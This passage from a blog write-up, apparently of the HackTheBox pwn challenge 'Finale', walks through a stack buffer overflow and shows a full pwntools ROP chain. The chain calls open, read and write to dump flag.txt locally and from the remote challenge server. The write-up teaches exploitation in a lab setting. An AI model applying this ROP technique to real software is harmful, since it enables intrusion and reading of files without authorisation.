class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">finale_patched</span>
Reading symbols from <span class="code-dark-green">finale_patched</span>...
(No debugging symbols found in <span class="code-dark-green">finale_patched</span>)
<span class="code-red">gef➤  </span>pattern create 100
<span class="code-blue">[+]</span> Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-red">gef➤  </span>run
Starting program: ./finale_patched


<span class="code-cyan">Let's celebrate Spooktober!!!</span>



<span class="code-cyan">                             ▝           ▝▘</span>
<span class="code-cyan">                     ▝▗▗      ▝</span>
<span class="code-cyan">                     ▞▚▘▝     ▝            ▗</span>
<span class="code-cyan">                       ▘  ▖      ▛▌        ▘</span>
<span class="code-cyan">              ▗           ▀            ▖        ▝</span>

<span class="code-cyan">                                  ▖</span>
<span class="code-cyan">              ▝             ▗▙  ▝           ▝▝</span>
<span class="code-cyan">               ▘            ▜           ▄▖</span>
<span class="code-cyan">                  ▝▛▙                           ▗▄</span>
<span class="code-cyan">                          ▗▖     ▘</span>
<span class="code-cyan">            ▖▖   ▘      ▗▗▚▚▚▘        ▖▖     ▖</span>
<span class="code-cyan">                         ▝▐▐▐              ▜▜▟▗</span>
<span class="code-cyan">            ▗▗      ▝▘    ▘       ▗▚       ▝▜▞</span>
<span class="code-cyan">             ▖▝  ▖                               ▞▖</span>
<span class="code-cyan">                        ▘   ▐▜▘</span>
<span class="code-cyan">            ▝▀▘   ▗▌            ▗         ▗▖</span>
<span class="code-cyan">                ▄         ▗            ▄      ▝▞▞▖</span>
<span class="code-cyan">          ▗▄▄    ▖   ▗ ▗    ▘</span>
<span class="code-cyan">         ▗▐▛▙█▄ ▖  ▖  ▗       ▘    ▝</span>
<span class="code-cyan">        ▗▜ ██▜▜▜▖▖ ▗       ▞▝        ▖           ▗</span>
<span class="code-cyan">       ▗▝▛▙▝▐███▙              ▝▝         ▖▘▖</span>
<span class="code-cyan">       ▛▖▀▟▄▖▘▛▌▀  ▀▘                           ▗</span>
<span class="code-cyan">     ▗▘▜▜▖▝▟▞▘                             ▘  ▞ ▘</span>
<span class="code-cyan">     ▛▙ ▜▞▀                                  ▝</span>
<span class="code-cyan">   ▗▌▐▀▀</span>
<span class="code-cyan">   ▞▀</span>




<span class="code-blue">[Strange man in mask screams some nonsense]: s4d</span>

<span class="code-blue">[Strange man in mask]: In order to proceed, tell us the secret phrase: s34s0nf1n4l3b00</span>

<span class="code-blue">[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [0x7fffffffdf70]</span>

<span class="code-blue">[Strange man in mask]: Now, tell us a wish for next year: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>  

<span class="code-blue">[Strange man in mask]: That's a nice wish! Let the Spooktober Spirit be with you!</span>


<span class="code-blue">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="code-blue">0x0000000000401491</span> in <span class="code-dark-yellow">finale</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>pattern offset $rsp
<span class="code-blue">[+]</span> Searching for '$rsp'
<span class="code-green">[+]</span> Found at offset 72 (little-endian search) <span class="code-red">likely</span>  
<span class="code-green">[+]</span> Found at offset 65 (big-endian search)
</code></pre></div><p>So we need exactly 72 bytes to reach the saved return address.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>The description of the challenge tells that the remote Glibc version has been modified, so we should not depend on Glibc to exploit the binary.</p><p>This time, instead of spawning a remote shell, we will aim to print the flag using functions <code>open</code>, <code>read</code> and <code>write</code>, which are already linked to the binary and thus do not depend on Glibc. In order to call them, we will use the Procedure Linkage Table (PLT), which is a table that has jump instructions to the corresponding entry of the Global Offset Table (GOT), which has the runtime addresses of the functions inside Glibc if they have been called at least once. Since PIE is disabled, the PLT addresses are static.</p><p>Since NX is enabled, we must use Return Oriented Programming (ROP) in order to execute arbitrary code. For x86_64 binaries, arguments for function calls are stored in registers (in order: <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;). We can set these registers using gadgets, which are sets of instructions that end in <code>ret</code>. The purpose of using gadgets is to fill the stack with pointers to gadgets, so that the program executes a gadget and returns to the next one. That&rsquo;s why this payload is known as ROP chain.</p><p>We can find useful gadgets for <code>$rdi</code> and <code>$rsi</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">finale</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': pop r.i ; ret'</span>  
0x00000000004012d6 <span class="code-red">: pop rdi ; ret</span>
0x00000000004012d8 <span class="code-red">: pop rsi ; ret</span>
</code></pre></div><p>Nevertheless, we don&rsquo;t have any simple way to set <code>$rdx</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">finale</span> | <span class="code-dark-green">grep</span> rdx
0x0000000000401574 : add rax, <span class="code-red">rdx</span> ; mov byte ptr [rax], 0 ; jmp 0x401588
0x0000000000401573 : clc ; add rax, <span class="code-red">rdx</span> ; mov byte ptr [rax], 0 ; jmp 0x401588
0x0000000000401571 : mov eax, dword ptr [rbp - 8] ; add rax, <span class="code-red">rdx</span> ; mov byte ptr [rax], 0 ; jmp 0x401588  
0x0000000000401011 : sal byte ptr [<span class="code-red">rdx</span> + rax - 1], 0xd0 ; add rsp, 8 ; ret
</code></pre></div><p>These are the declarations for <a href="https://www.man7.org/linux/man-pages/man2/open.2.html"><code>open</code></a>, <a href="https://www.man7.org/linux/man-pages/man2/read.2.html"><code>read</code></a> and <a href="https://www.man7.org/linux/man-pages/man2/write.2.html"><code>write</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">pathname</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> <span><span class="mtk9 mtki">flags</span><span class="mtk1">);</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">buf</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">count</span><span class="mtk1">);</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">buf</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">count</span><span class="mtk1">);</span>  
</code></pre></div><h3 id="finding-a-stable-rop-chain">Finding a stable ROP chain</h3><p>There will be no problem when calling <code>open</code>, because it expects two arguments (<code>$rdi</code> and <code>$rsi</code>). But <code>read</code> and <code>write</code> require <code>$rdx</code> to contain the count of bytes to read/write, so it is an important value.</p><p>Luckily, there are some calls to <code>read</code> and <code>write</code> in <code>finale</code>, let&rsquo;s disassemble this function:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel --disassemble=finale <span class="mtku">finale</span>

finale:     file format elf64-x86-64


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .plt.sec:

Disassembly of section .text:

0000000000401407 &lt;finale&gt;:
  401407:       f3 0f 1e fa             endbr64
  40140b:       55                      push   rbp
  40140c:       48 89 e5                mov    rbp,rsp
  40140f:       48 83 ec 40             sub    rsp,0x40
  401413:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401417:       48 89 c6                mov    rsi,rax
  40141a:       48 8d 05 ef 13 00 00    lea    rax,[rip+0x13ef]        # 402810 &lt;_IO_stdin_used+0x810&gt;
  401421:       48 89 c7                mov    rdi,rax
  401424:       b8 00 00 00 00          mov    eax,0x0
  401429:       e8 12 fd ff ff          call   401140 &lt;printf@plt&gt;
  40142e:       48 8d 05 3b 14 00 00    lea    rax,[rip+0x143b]        # 402870 &lt;_IO_stdin_used+0x870&gt;
  401435:       48 89 c7                mov    rdi,rax
  401438:       b8 00 00 00 00          mov    eax,0x0
  40143d:       e8 fe fc ff ff          call   401140 &lt;printf@plt&gt;
  401442:       48 8b 05 d7 2b 00 00    mov    rax,QWORD PTR [rip+0x2bd7]        # 404020 &lt;stdin@@GLIBC_2.2.5&gt;
  401449:       48 89 c7                mov    rdi,rax
  40144c:       e8 4f fd ff ff          call   4011a0 &lt;fflush@plt&gt;
  401451:       48 8b 05 b8 2b 00 00    mov    rax,QWORD PTR [rip+0x2bb8]        # 404010 &lt;stdout@@GLIBC_2.2.5&gt;  
  401458:       48 89 c7                mov    rdi,rax
  40145b:       e8 40 fd ff ff          call   4011a0 &lt;fflush@plt&gt;
  401460:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401464:       ba 00 10 00 00          mov    edx,0x1000
  401469:       48 89 c6                mov    rsi,rax
  40146c:       bf 00 00 00 00          mov    edi,0x0
  401471:       e8 fa fc ff ff          call   401170 &lt;read@plt&gt;
  401476:       ba 54 00 00 00          mov    edx,0x54
  40147b:       48 8d 05 2e 14 00 00    lea    rax,[rip+0x142e]        # 4028b0 &lt;_IO_stdin_used+0x8b0&gt;
  401482:       48 89 c6                mov    rsi,rax
  401485:       bf 01 00 00 00          mov    edi,0x1
  40148a:       e8 a1 fc ff ff          call   401130 &lt;write@plt&gt;
  40148f:       90                      nop
  401490:       c9                      leave
  401491:       c3                      ret

Disassembly of section .fini:

<span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel --disassemble=finale <span class="mtku">finale</span> | <span class="code-dark-green">grep</span> .dx
  401464:       ba 00 10 00 00          mov    <span class="code-red">edx</span>,0x1000
  401476:       ba 54 00 00 00          mov    <span class="code-red">edx</span>,0x54
</code></pre></div><p>So after calling <code>finale</code>, <code>$rdx</code> will be set to <code>0x54</code> which is enough.</p><p>Therefore, we will call <code>open</code>, then return to <code>finale</code> and then call <code>read</code> and <code>write</code>. We must use this order because <code>open</code> sets <code>$rdx = 0</code> at the end.</p><h2 id="exploit-development">Exploit development</h2><p>For the call to <code>open</code>, we must use a pointer to <code>"flag.txt"</code> as <code>pathname</code> and <code>0</code> as <code>flags</code> (which read-only mode). Notice that <code>finale</code> outputs the address of <code>data</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">finale</span><span class="mtk1">() {</span>
<span class="mtk1">  undefined data[</span><span class="mtk6">64</span><span class="mtk1">];</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[Strange man in mask]: Season finale is here! Take</span><span class="mtk4"> this souvenir with you for good luck:  [</span><span class="mtk6">%p</span><span class="mtk4">]"</span><span class="mtk1">, data);</span>  
<span class="mtk3">  // ...</span>
<span class="mtk1">}</span>
</code></pre></div><p>So we can extract this pointer and use it as the pointer to <code>"flag.txt"</code>. Therefore, our junk data must start with <code>"flag.txt"</code> and we can fill the rest with null bytes up to 72 bytes (the offset):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'In order to proceed, tell us the secret phrase: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'s34s0nf1n4l3b00'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Season finale is here! Take this souvenir with yo</span><span class="mtk4">u for good luck: ['</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">']'</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">()[:</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk6">16</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">rop</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ROP</span><span class="mtk1">(</span><span class="mtk1">elf</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">pop_rdi_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop rdi'</span><span class="mtk1">, </span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">]</span>
<span class="mtk1">    </span><span class="mtk1">pop_rsi_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop rsi'</span><span class="mtk1">, </span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">72</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'flag.txt'</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rsi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.open)</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.finale)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Now, tell us a wish for next year: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './finale_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc'</span>
[<span class="code-green">+</span>] Starting local process './finale_patched': pid 465900
[<span class="code-blue">*</span>] Loading gadgets for './finale_patched'
[<span class="code-blue">*</span>] Switching to interactive mode

[Strange man in mask]: That's a nice wish! Let the Spooktober Spirit be with you!


[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [0x7ffc476c9ef0]  

[Strange man in mask]: Now, tell us a wish for next year: <span class="code-red">$</span>
</code></pre></div><p>As shown, we have executed <code>finale</code> again, so the ROP chain has worked.</p><p>Now we can continue with the next part of the ROP chain. Since the program opens three file descriptors at the start (<code>0</code> for <code>stdin</code>, <code>1</code> for <code>stdout</code> and <code>2</code> for <code>stderr</code>), the next file descriptor will be <code>3</code>. This value is used by <code>read</code>. We can use the address leak again to store the contents of <code>flag.txt</code>. The <code>write</code> call is very similar to <code>read</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">fd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">3</span>
<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">72</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'flag.txt'</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rsi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.open)</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.finale)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Now, tell us a wish for next year: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">fd</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rsi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.read)</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">1</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rsi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.write)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Now, tell us a wish for next year: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
</code></pre></div><p>Using the above code, we can finish the exploit and get the flag locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './finale_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc'</span>
[<span class="code-green">+</span>] Starting local process './finale_patched': pid 470225  
[<span class="code-blue">*</span>] Loaded 7 cached gadgets for 'finale_patched'
b'HTB{f4k3_fl4g_f0r_t3st1ng}\n'
[<span class="code-blue">*</span>] Stopped process './finale_patched' (pid 470225)
</code></pre></div><h2 id="flag">Flag</h2><p>So, let&rsquo;s try remotely:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 159.65.49.148:31748
[<span class="code-blue">*</span>] './finale_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc'</span>
[<span class="code-green">+</span>] Opening connection to 159.65.49.148 on port 31748: Done  
[<span class="code-blue">*</span>] Loaded 7 cached gadgets for 'finale_patched'
b'HTB{wh0_n33d5_l1bc_wh3n_u_h4v3_st4ck_l45k5}\n'
[<span class="code-blue">*</span>] Closed connection to 159.65.49.148 port 31748
</code></pre></div><p>The full exploit code is here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Finale/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#environment-setup">Environment setup</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#finding-a-stable-rop-chain">Finding a stable ROP chain</a></li></ul></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
